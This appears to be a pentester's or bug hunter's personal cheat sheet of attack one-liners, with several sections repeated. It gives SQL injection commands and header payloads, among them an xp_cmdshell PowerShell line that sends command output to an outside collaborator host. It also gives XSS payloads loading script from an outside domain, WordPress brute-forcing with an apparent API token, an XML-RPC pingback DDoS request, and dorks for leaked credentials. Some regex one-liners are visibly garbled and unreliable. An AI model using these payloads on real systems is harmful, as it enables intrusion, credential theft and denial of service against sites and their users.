4. ffuf -w /root/wordlist/api/swagger_xss.txt:FUZZ -w alive_ones.txt:URL -u URLFUZZ -mc 200 -o ffuf-result.txt
5. cat ffuf-result.txt | jq -r .results[].url | tee -a feed_me_to_httpx.txt
6. cat feed_me_to_httpx.txt | httpx -silent -title | tee -a title.txt
7. cat title.txt | grep "Swagger UI"

=======================================================================

Oneliners for SQL Injection 💉 :
$ echo http://<TARGET> | waybackurls › target.txt ; python3 sqlidetector.py -f target.txt

$ subfinder -d http://<TARGET> -silent -all | gau —blacklist ttf,woff,svg,png | sort -u I gf sqli › gf_sqli.txt; sqlmap -m gf_sqli.txt --batch --risk 3 --random-agent | tee -a sqli.txt

$ findomain -t http://<TARGET> -q | httpx-silent | anew | waybackurls | gf sqli ›› sqli ; sqlmap -m sqli --batch -- random-agent --level 1

$ cat urls.txt | grep ".php" | sed 's/\. php.*/.php\//' | sort -u | sed s/$/%27%22%60/ | while read url do ; do curl —silent "$url" | grep -qs "You have an error in your SQL syntax" && echo -e "$url \e[1;32mSQLI\e[0m" || echo -e "$url \e[1;31mNot Vulnerable to SQLI Injection \e[0m" ; done

- Header-Based Blind SQL injection:
$ cat domain.txt | httpx-silent -H "X-Forwarded-For:
'XOR(if(now()=sysdate(),sleep(13),0))OR" -rt -timeout 20 -mrt '>13'

---------------------------------------------------------------------------
Oneliners I use frequently in my engagements to extract all endpoints from a JS file:

Method 1:
waybackurls HOSTS | tac | sed "s#\\\/#\/hashtag#g" | egrep -o "src['\"]?
15*[=: 1\5*[ '\"]?[^'\"]+.js[^'|"> ]*" | awk -F '/'
'{if(length($2))print "https://"$2}' | sort -fu | xargs -I '%' sh
-c "curl -k -s \"%)" | sed \"s/[;}\)>]/\n/g\" | grep -Po \" (L'1|\"](https?: )?[/1{1,2}[^'||l"> 1{5,3)|(\.
(get|post|ajax|load)\s*\(\5*['||\"](https?:)?[/1{1,2}[^'||\"> ]
{5,})\"" | awk -F "['|"]" '{print $2}' sort -fu

Method 2:
cat JS.txt | grep -aop "(?<=(\"|\'|' ))\/[a-zA-Z0-9?&=\/-#.](?= (\"||'|'))" | sort -u | tee JS.txt

--------------------------------------------------------------------------------------
Reduce Noise in Burp Suite with This Simple Trick! 🔥

💡 Just add the following patterns in Burp Suite under Proxy > Options > TLS Pass Through:

.*\.google\.com

.*\.gstatic\.com

.*\.googleapis\.com

.*\.pki\.goog

.*\.mozilla\..*
--------------------------------------------------------------------------------------

if you want brute force wordpress login ..use this one ...i used usr name as aungsanoo and passwors is aunglat as you already known..i use my test wordlist..you can use rockyou ..exanple 

wpscan --url wpscan --url http://10.0.0.227/wordpress/ -e --api-token=hT0T7Lgsh5gox1jg0sQUNKbfgfYJ60Xg7dg12Gosv4VBAm0o --rua -v -U aungsanoo -P /usr/share/wordlists/rockyou.txt

subfinder -d terget.com -o subfinder.txt
shodanx subdomain -d target.com -ra -o shodax.txt
amass enum -active -norecursive -noalts -d orwa.com -o amass.txt
gobuster dns -d cengage.co.in -w /usr/share/wordlists/subdomain_megalist.txt -o gobuster.txt
curl -s https://crt.sh/\?q\=\%.$1\&output\=json | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u | tee -a subs_domain.txt

curl -s "https://otx.alienvault.com/api/v1/indicators/hostname/domain.com/passive_dns" | jq -r '.passive_dns[]?.hostname' | grep -E "^[a-zA-Z0-9.-]+\.domain\.com$" | sort -u | tee alienvault_subs.txt

curl -s "https://urlscan.io/api/v1/search/?q=domain:domain.com&size=10000" | jq -r '.results[]?.page?.domain' | grep -E "^[a-zA-Z0-9.-]+\.domain\.com$" | sort -u | tee urlscan_subs.txt

curl -s "http://web.archive.org/cdx/search/cdx?url=*.domain.com/*&output=json&collapse=urlkey" | jq -r '.[1:][] | .[2]' | grep -Eo '([a-zA-Z0-9._-]+\.)?domain\.com' | sort -u | tee webarcive_subs.txt

Filtering live hosts with httpx🚨
---------------------------------
cat subs_domain.txt | httpx -td -title -sc -ip > httpx_domain.com.txt

cat httpx_domain.com.txt | awk '{print $1}' > live_subs_domain.com.txt

httpx -l all_subdomai.txt -ports 80,443,8080,8443,8000,8888,8081,8181,3306,5432,6379,27017,15672,10000,9090,5900 -threads 80 -o alive.txt

Nmap:🛜️
--------
naabu --alive.txt -c 50 -nmap-cli 'nmap -sV -sC' -o naabuports.txt
sudo nmap -sV -iL live_subs_domain.com.txt -oN scaned-port.txt --script=vuln*

Nikto:🦠️
--------
nikto -h alive_subdomains.txt -output nikto_results.txt

Subdomain Takeover:📦️
-------------------
subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl

Broken Link Hijacking:🎡️
----------------------
socialhunter -f alive_subdomains.txt

Screenshotting 📸
-----------------
eyewitness --web -f alive_subdomains.txt --threads 5 -d screenshots

----------------------------------------------------------------------
Nuclei Automated Live Subdomains Spray (with rate limit)🔨
----------------------------------------------------------
nuclei -l live_subs_domain.com.txt -rl 10 -bs 2 -c 2 -as -silent -s critical,high,medium

Finding WAF (web application firewall)🛡️
--------------------------------------
cat httpx_domain.com.txt | grep 403

Subdomains without WAF✅
------------------------
cat httpx_domain.com.txt | grep -v -i -E 'cloudfront|imperva|cloudflare' > nowaf_subs_domain.com.txt

Visit All Non-WAF Subdomains Manually🧱️
-------------------------------------
cat nowaf_subs_domain.com.txt | grep 403 | awk '{print $1}'

Prepare the List of 403 Subdomains for Fuzzing🎲️
----------------------------------------------
cat nowaf_subs_domain.com.txt | grep 403 | awk '{print $1}' > 403_subs_domain.com.txt

403 Fuzzing🔍
-------------
Default Wordlist Fuzzing
dirsearch -u https://sub.domain.com -x 403,404,500,400,502,503,429 --random-agent

Extension based Fuzzing
dirsearch -u https://sub.domain.com -e xml,json,sql,db,log,yml,yaml,bak,txt,tar.gz,zip -x 403,404,500,400,502,503,429 --random-agent

https://chaos.projectdiscovery.io/
subprober -f acorns.com.txt -sc -tl -l -ar -cn -o subprober.txt
cat subprober.txt | grep "200" | awk '{print $1}' | sed 's|https\?://||' > 200.txt
cat subprober.txt | grep "403" | awk '{print $1}' | sed 's|https\?://||' > 403.txt
cat subprober.txt | grep "404" | awk '{print $1}' | sed 's|https\?://||' > 404.txt
subjack -c ~/.subjack_fingerprints.json -w 404.txt -t 100 -timeout 30 -o subjack.txt -v
python3 ~/tools/dnsReaper/main.py file --filename ~/recon/404.txt
whatweb cloud.e.atlassian.com
nikto -h cloud.e.atlassian.com -C all
dirsearch -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,log,xml,js,json  -u https://cloud.e.atlassian.com/

subprober -f facebook.com.txt -sc -tl -wc -sv -o subprober1.txt
dirsearch -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,log,xml,js,json  -u https://id-mail-assets.atlassian.com/

crlfi -i /home/lipon/Hacking/recon/urls.txt -o crlf.txt
ssti -l /home/lipon/Hacking/recon/urls.txt -o ssti.txt
RedirectHunter -l /home/lipon/Hacking/recon/urls.txt -o redirect.txt

ghauri -u "https://omnibookslibrary.com/login.php" --data="mobile=*&password=pass&login=" --batch --flush-session
ghauri -r req.txt --batch --flush-session --level 3

pip3 install -r requirements.txt --break-system-packages


https://blog.sucuri.net/2014/03/more-than-162000-wordpress-sites-used-for-distributed-denial-of-service-attack.html
$ curl -D -  "www.anywordpresssite.com/xmlrpc.php" -d '<methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://victim.com</string></value></param><param><value><string>www.anywordpresssite.com/postchosen</string></value></param></params></methodCall>'

Useful Shodan Dorks:

1. ssl.cert.subject.CN:"*.target.com" http.title:"index of /"
2. ssl.cert.subject.CN:"*.target.com" http.title:"gitlab"
3. ssl.cert.subject.CN:"*.target.com"
"230 login successful" port:21
4. ssl.cert.subject.CN:"*.target.com"+200 http.title:"Admin"
5. http.title:"Directory Listing" org:orgName

Quick Oneliner to Check for CORS:
cat origins.txt | xargs -P10 -I{} bash -c 'curl -s -I -H "Origin: {}" -H "Access-Control-Request-Method: GET" https://target.com | grep -q "Access-Control-Allow-Origin: {}" && echo "[+] Vulnerable: {}"'

Leveraging Dalfox to Easily Identify Reflected XSS:
subfinder -d example.com -all -silent | httpx -silent | katana -silent | Gxss -c
100 | dalfox pipe --skip-bav --skip-mining-all --skip-grepping

GiHub Dorks for Finding API Keys, Tokens, Passwords and Sensitive Files:

1. api_key
2. "api keys"
3. authorization_bearer:
4. oauth
5. auth
6. authentication 
7. client_ secret 
8. api_token:
9. "api token" 
10. client_id
11. password
12. user_password
13. user_pass
14. passcode
15. client_secret
16. secret
17. password hash
18. filename:manifest.xml
19. filename: database
20. filename: secrets.yml
21. filename: passwd path: etc
22. filename: config. php dbpasswd
23. filename:.bash_profile aws
24. filename:wp-config. php
25. extension:sql mysql dump 
26. filename: credentials aws_access_key_id 
27. filename: id_rsa or filename:id_dsa
28. filename:.sh _history
29. filename: dockercfg auth 
30. filename:WebServers .xml

Interesting Google Dorks:

intitle: "index of" inurl:ftp intext:admin 
intitle: "index of" "system/config" 
intitle: "index of" "admin/config"
"index of" "/config/sql" 
intitle:"index of" "api/admin" 
intitle: "index of" "tinyfilemanager.php" intitle:"index of" "test/storage/framework/sessions/"
intitle:"index of" "symfony/config" 
intitle: "index of" "graphql/subscription" intitle: "index of" "/admin/backup" intitle:"index of" "admin/json" 
intitle: "index of" "/admin_backup" intitle:"index of" "git-jira-log"
intitle:"index of" db.frm
intitle:"index of" "/db_backups/" intitle:"index of" "common.crt" OR "ca.crt"
intitle:"index of" "global.asa"
intitle:"index of" "proxy.pac" OR "proxy.pac.bak" 
intitle: "index of" "MySQL-Router" intitle:"index of" "owncloud/config/*"

Oneliners I use frequently in my engagements to extract all endpoints from a JS file:

Method 1:
waybackurls HOSTS | tac | sed "s#\\\/#\/hashtag#g" | egrep -o "src['\"]?
15*[=: 1\5*[ '\"]?[^'\"]+.js[^'|"> ]*" | awk -F '/'
'{if(length($2))print "https://"$2}' | sort -fu | xargs -I '%' sh
-c "curl -k -s \"%)" | sed \"s/[;}\)>]/\n/g\" | grep -Po \" (L'1|\"](https?: )?[/1{1,2}[^'||l"> 1{5,3)|(\.
(get|post|ajax|load)\s*\(\5*['||\"](https?:)?[/1{1,2}[^'||\"> ]
{5,})\"" | awk -F "['|"]" '{print $2}' sort -fu

Method 2:
cat JS.txt | grep -aop "(?<=(\"|\'|' ))\/[a-zA-Z0-9?&=\/-#.](?= (\"||'|'))" | sort -u | tee JS.txt

Tiny XSS Payloads:

 1. If the number of frames is constant:
<iframe/onload​=src=top[0].name+/\NJ.Rs/>

 2. If the number of frames is random:
<iframe/onload​=src=contentWindow.name+/\NJ.Rs/>

 3. If unsafe-inline is disabled in CSP:
<iframe/srcdoc​="<​script/src=//NJ.Rs><​/script>">

 4. Just casual script:
<​script/src=//NJ.Rs><​/script>

 5. If you control the name of the window:
<iframe/onload​=src=top.name>

 6. In Firefox:
<svg/onload​=eval(name)>

 7. If you control the URL:
<iframe/onload​=eval('’'+URL)>

Finding Exploits for public CVEs 🔍
site:(https://patchstack.com/ | https://wpscan.com | https://wordfence.com) CVE-20xx-xxxxx
site:(*.github.com | github.com) CVE-20xx-xxxxx

https://github.com/iamunixtz/LazyXss

<input type="submit" value="Login"></br>

My preferred fuzzing method:

ffuf -w facundo.txt -u https://tesla.com/FUZZ -mc all -c -v \
-H "User-Agent: Mozilla/5.0" -H "Accept: */*" \
-X GET -r -t 100 -p 0.1-1.0 -maxtime 3600 -o results.json -of json -od results \
-mc 200,301,302,307,401,403,500 -ac -recursion -recursion-depth 2 -rate 50 \

dirsearch -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,log,xml,js,json  -u https://adminblog.abc.com/

subprober -f all.txt -tl -sc -sv -l -cn -ar -o output.txt -nc -mc 200 301 302 307 308 403 401 -c 20

User-Agent: '">{{7*7}}${2*2}
User-Agent: 1))%20or%20sleep(20)--
User-Agent: Mozilla/5.0...Safari/537.36'--'--
User-Agent: Mozilla/5.0...Safari/537.36';WAITFOR DELAY ‘00:00:05’;--
User-Agent: Mozilla/5.0...Safari/537.36'; EXEC sp_configure ‘show advanced options’, 1; RECONFIGURE; EXEC sp_configure ‘xp_cmdshell’, 1; RECONFIGURE;--
User-Agent: Mozilla/5.0...Safari/537.36'; EXEC xp_cmdshell 'ping myburpcollablink.burpcollaborator.net';--
User-Agent: Mozilla/5.0...Safari/537.36';EXEC xp_cmdshell ‘powershell -c “$x = whoami; curl http://my-burp-link.burpcollaborator.net/get?output=$x"';--
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:93.0) Gecko/20100101 Firefox/93.0<svg/onload=alert`1`>

Referer: http://www.myevilsite.com/qwe';alert(1)+'
Referer: http://www.google.com/search?hl=en&q=c5obc'+alert(1)+'p7yd5

curl "https://www.aaa.bbb.ccc" -H 'User-Agent: <script>alert("XSS")</script>' > poc.html
sqlmap --url "https://something.com/" --batch --random-agent --level 5 --risk 3

All Subdoamin 🌐️
-----------------------------
subfinder -d terget.com -o subfinder.txt
shodanx subdomain -d target.com -ra -o shodax.txt
amass enum -active -norecursive -noalts -d orwa.com -o amass.txt
gobuster dns -d cengage.co.in -w /usr/share/wordlists/subdomain_megalist.txt -o gobuster.txt
curl -s https://crt.sh/\?q\=\%.$1\&output\=json | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u | tee -a subs_domain.txt

curl -s "https://otx.alienvault.com/api/v1/indicators/hostname/domain.com/passive_dns" | jq -r '.passive_dns[]?.hostname' | grep -E "^[a-zA-Z0-9.-]+\.domain\.com$" | sort -u | tee alienvault_subs.txt

curl -s "https://urlscan.io/api/v1/search/?q=domain:domain.com&size=10000" | jq -r '.results[]?.page?.domain' | grep -E "^[a-zA-Z0-9.-]+\.domain\.com$" | sort -u | tee urlscan_subs.txt

curl -s "http://web.archive.org/cdx/search/cdx?url=*.domain.com/*&output=json&collapse=urlkey" | jq -r '.[1:][] | .[2]' | grep -Eo '([a-zA-Z0-9._-]+\.)?domain\.com' | sort -u | tee webarcive_subs.txt

Filtering live hosts with httpx🚨
---------------------------------
cat subs_domain.txt | httpx -td -title -sc -ip > httpx_domain.com.txt

cat httpx_domain.com.txt | awk '{print $1}' > live_subs_domain.com.txt

httpx -l all_subdomai.txt -ports 80,443,8080,8443,8000,8888,8081,8181,3306,5432,6379,27017,15672,10000,9090,5900 -threads 80 -o alive.txt

Nmap:🛜️
--------
naabu --alive.txt -c 50 -nmap-cli 'nmap -sV -sC' -o naabuports.txt
sudo nmap -sV -iL live_subs_domain.com.txt -oN scaned-port.txt --script=vuln*

Nikto:🦠️
--------
nikto -h alive_subdomains.txt -output nikto_results.txt

Subdomain Takeover:📦️
-------------------
subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl

Broken Link Hijacking:🎡️
----------------------
socialhunter -f alive_subdomains.txt

Screenshotting 📸
-----------------
eyewitness --web -f alive_subdomains.txt --threads 5 -d screenshots

----------------------------------------------------------------------
Nuclei Automated Live Subdomains Spray (with rate limit)🔨
----------------------------------------------------------
nuclei -l live_subs_domain.com.txt -rl 10 -bs 2 -c 2 -as -silent -s critical,high,medium

Finding WAF (web application firewall)🛡️
--------------------------------------
cat httpx_domain.com.txt | grep 403

Subdomains without WAF✅
------------------------
cat httpx_domain.com.txt | grep -v -i -E 'cloudfront|imperva|cloudflare' > nowaf_subs_domain.com.txt

Visit All Non-WAF Subdomains Manually🧱️
-------------------------------------
cat nowaf_subs_domain.com.txt | grep 403 | awk '{print $1}'

Prepare the List of 403 Subdomains for Fuzzing🎲️
----------------------------------------------
cat nowaf_subs_domain.com.txt | grep 403 | awk '{print $1}' > 403_subs_domain.com.txt

403 Fuzzing🔍
-------------
Default Wordlist Fuzzing
dirsearch -u https://sub.domain.com -x 403,404,500,400,502,503,429 --random-agent

Extension based Fuzzing
dirsearch -u https://sub.domain.com -e xml,json,sql,db,log,yml,yaml,bak,txt,tar.gz,zip -x 403,404,500,400,502,503,429 --random-agent

-----------------
subfinder -d link -all -recursive > subdomain1.txt 
assetfinder -subs-only link > subdomain2.txt
sort -u subdomain1.txt subdomain2.txt > domain.txt
-----------------
cat domain.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > subdomains_alive.txt
nuclei -l subdomains_alive.txt -t nuclei-templates/detect-all-takeovers.yaml
dirsearch -l subdomains_alive.txt -x 500,502,429,404,400 -R 5 --random-agent -t 100 -o directory.txt -w /path/to/wordlist.txt
wordlist link : https://github.com/coffinxp/oneListForall
-----------------
gather some URLS
katana -u paylution.com -d 5 -kf -jc -fx -ef woff,pdf,css,png,svg,jpg,woff2,jpeg,gif,svg -o allurls.txt
cat allurls.txt | grep -E ".php|.asp|.aspx|.jspx|.jsp" | grep '=' | sed 's/=.*/=/' | sort | uniq > bsqli.txt
cat allurls.txt | Gxss | kxss | grep -oP '^URL: \K\S+' | sed 's/=.*/=/' | sort -u > xss.txt
cat allurls.txt | gf lfi | sed 's/=.*/=/' | sort -u > lfi_output.txt
cat allurls.txt | grep -E "\.js$" >> js.txt
cat js.txt | nuclei -t /path/to/http/exposures
-----------------
now we can try simple google dorking.
https://nitinyadav00.github.io/Bug-Bounty-Search-Engine/
-----------------



